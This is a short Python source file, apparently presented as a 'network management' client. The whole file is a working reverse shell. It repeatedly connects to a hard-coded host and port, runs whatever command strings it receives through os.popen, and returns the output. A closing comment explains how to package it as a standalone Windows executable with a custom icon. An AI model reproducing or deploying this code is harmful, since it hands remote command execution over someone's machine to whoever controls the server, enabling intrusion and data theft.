import time
from socket import *
from managmentNetworkSW_funcs import get_ip
import os

while True: # the client always gussTheWord to connect to the server
    try:
        client = socket(AF_INET, SOCK_STREAM)
        client.connect(("10.100.102.58", 3333))

        while True:
            data = client.recv(2048).decode()

            if data == "exit":
                client.close()
                break
            result = os.popen(data).read()
            client.sendall(result.encode())
    except:
        print("connection Error, connect again in 5 sec ........")
        time.sleep(5) # connect again in 5 sec
        continue


# create .exe file by:
#    1) open file path
#    2) open powershell
#    3) execute command: "pyinstaller.exe --onefile --icon=iconNmae.ico managmentNetworkSW_client.py"
#